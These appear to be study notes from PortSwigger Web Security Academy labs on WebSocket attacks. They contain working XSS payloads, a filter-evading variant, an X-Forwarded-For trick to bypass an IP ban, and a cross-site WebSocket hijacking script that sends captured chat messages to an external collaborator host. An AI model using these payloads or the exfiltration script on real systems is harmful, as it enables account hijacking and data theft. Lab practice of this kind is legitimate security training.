# Manipulating messages to exploit vulnerabilities
## This has an XSS vulnerability
- To exploit, interecpt the live chat message and change it to: `<img src=1 onerror='alert(1)'>`

# Cross-site web socket hijacking
- Occurs when only the session token is used in the handshake
- This is the exploit:
```html
<script>
    var ws = new WebSocket('wss://0a97007904d6e29880c2bccb00cd0079.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://qe8g9qt4z45jh7hrj2jrjzoyhpngb6zv.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

# Manipulating the WebSocket handshake to exploit vulnerabilities
- Again there is XSS, however this time if you send one it blacklists the IP 
    - You can use X-Forwarded-For to bypass this on the handshake
- Used repeater to reconnect with the header and used this payload: ```<img src=1 oNeRrOr=alert`1`>```
